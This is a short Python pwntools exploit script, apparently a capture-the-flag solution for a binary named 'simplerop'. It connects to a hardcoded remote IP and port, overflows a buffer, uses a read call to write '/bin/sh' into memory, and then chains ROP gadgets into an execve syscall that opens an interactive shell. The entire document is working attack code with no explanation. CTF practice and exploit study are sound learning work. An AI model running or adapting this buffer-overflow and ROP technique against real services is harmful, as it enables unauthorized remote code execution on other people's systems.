from pwn import *
import time

ip = "140.110.112.77"
port = 2126

r = remote(ip, port)
# r = process("./simplerop")

main = 0x8048e24
data = 0x80eb000 - 0x100
read = 0x806CD50
pop_eax = 0x80bae06
pop_ecx_ebx = 0x806e851
pop_edx = 0x806e82a
syscall = 0x80493e1

r.sendlineafter(':', b'a' * 32 + flat(read, main, 0, data, 0x100))
time.sleep(0.1)
r.send('/bin/sh\x00')
r.sendlineafter(':', b'a' * 24 + flat(pop_eax, 11, pop_ecx_ebx, 0, data, pop_edx, 0, syscall))

r.interactive()
